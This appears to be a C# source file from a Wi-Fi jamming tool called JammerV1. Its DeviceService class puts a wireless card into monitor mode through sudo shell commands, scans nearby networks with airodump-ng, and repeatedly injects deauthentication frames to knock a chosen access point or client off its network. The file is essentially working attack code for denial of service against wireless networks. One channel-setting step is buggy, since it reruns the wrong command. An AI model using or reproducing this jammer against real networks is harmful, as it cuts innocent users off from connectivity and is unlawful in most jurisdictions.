using System.Threading.Tasks;
using System.Globalization;
using System.Threading;
using System;
using SharpPcap;
using SharpPcap.LibPcap;
using CliWrap;
using CliWrap.Buffered;
using JammerV1.Models;
using System.Text;
using System.Collections.Generic;
using System.Diagnostics.Contracts;

public class DeviceService : IDeviceService {

    private IInjectionDevice _captureDevice = null;

    public IInjectionDevice CaptureDevice { get => _captureDevice; }

    public async Task<bool> IsDeviceInMonitorMode(string deviceName) {
        // Trying to avoid dependency on aircrack-ng suite - use iwconfig with CliWrap.
        var stdOutBuffer = new StringBuilder();
        var result = await Cli.Wrap("/bin/bash")
            .WithArguments(new[] {"-c", $"iwconfig {deviceName} | grep Mode:Monitor"})
            .ExecuteBufferedAsync();
        return result.StandardOutput.Contains("Mode:Monitor");
    }

    public async Task<bool> SetMonitorMode(string deviceName) {
        // Need to bring down the interface first
        await Cli.Wrap("/bin/bash")
            .WithArguments(new[] {"-c", $"sudo ifconfig {deviceName} down"})
            .ExecuteAsync();

        // Now put the interface into monitor mode
        var cmd = Cli.Wrap("/bin/bash")
            .WithArguments(new[] {"-c", $"sudo iwconfig {deviceName} mode monitor"});
        var result = await cmd.ExecuteAsync();

        // Channel 11 for testing
        var c = Cli.Wrap("/bin/bash")
            .WithArguments(new[] {"-c", $"sudo iwconfig {deviceName} channel 11"});
        var r = await cmd.ExecuteAsync();

        // Put interface back up
        await Cli.Wrap("/bin/bash")
            .WithArguments(new[] {"-c", $"sudo ifconfig {deviceName} up"})
            .ExecuteAsync();
        return result.ExitCode == 0;
    }

    public async Task<bool> ChangeChannel(int channel) {
        Console.WriteLine("Changing channel to {0}", channel.ToString());
        var cmd = Cli.Wrap("/bin/bash")
            .WithArguments(new[] {"-c", $"sudo iwconfig {_captureDevice.Name} channel {channel.ToString()}"});
        var result = await cmd.ExecuteAsync();
        return result.ExitCode == 0;
    }

    public async Task OpenDevice()
    {
        // TODO: Here, going to need checks for: permissions, no device available, device can't do monitor mode
        // Step 1 - check if any device is already in monitor mode - best case scenario
        // Step 2 - Try to send a dummy packet to test if the device can inject packets
        // Step 3 - Loop through remaning devices which passed the above test, and try to put them into monitor mode.
        foreach(var device in CaptureDeviceList.Instance) {
            try {
                if (await IsDeviceInMonitorMode(device.Name)) {
                    Console.WriteLine($"Already found {device.Name} in monitor mode, will use that");
                    _captureDevice = device as IInjectionDevice; // Set the capture device here if needed
                    return;
                }
            } catch (Exception) { }
        }
        
        foreach(var device in CaptureDeviceList.Instance) {
            // wlan0 capable of injection on my debian dev machine!! WTF!!
            if (device.Name == "wlan0") {continue;}
            device.Open(DeviceModes.Promiscuous);
            try {
                // See if the device can inject packets
                byte[] dummyPacket = new byte[64];
                Array.Clear(dummyPacket, 0, dummyPacket.Length);
                device.SendPacket(dummyPacket);
                await SetMonitorMode(device.Name);
                _captureDevice =  device as IInjectionDevice;
                //device.Close();
                return;

            } catch (PcapException) { }
              //finally { device.Close(); }
        }
    }

    public async Task Jam(IJammableDevice victim) {
        using (var device = _captureDevice) {
            device.Open(DeviceModes.Promiscuous);
            if (victim is AP ap) { ChangeChannel(ap.Channel); }
            try
            {
                byte[] deauthFrame = victim.GenerateDeauthFrame();
                while (victim.IsJammed)
                {
                    await Task.Delay(100);
                    device.SendPacket(deauthFrame);
                }
            }
            catch (PcapException ex) { 
                Console.WriteLine("Got a PcapException - {0}", ex); 
            }
        }
    }

    public async Task Scan(int secondsToRun) {
        // First, use airodump-ng to get raw output
        using var cancellation_token = new CancellationTokenSource();
        var airodumpCmd = Cli.Wrap("airodump-ng")
            .WithArguments($"-a --write-interval 1 -w {Constants.Paths.BaseDirectory}/jammer {_captureDevice.Name}");

        cancellation_token.CancelAfter(TimeSpan.FromSeconds(secondsToRun));

        // Execute airodump-ng command with handling for cancellation
        try
        {
            await airodumpCmd.ExecuteAsync(cancellation_token.Token);
        }
        catch (OperationCanceledException) { }

        // Now run the sed command to filter output
        try
        {
            var sedCmd = Cli.Wrap("sed")
                .WithArguments(new[] {
                    "-e", "/^[[:space:]]*$/d",
                    "-e", "/^BSSID/d",  
                    "-e", "/^Station MAC/d",
                    Constants.Paths.DirtyJammerOutputFilePath
                })
                .WithStandardOutputPipe(PipeTarget.ToFile(Constants.Paths.CleanedJammerOutputFilePath));

            var result = await sedCmd.ExecuteBufferedAsync();
        }
        catch (Exception) { }
    }
}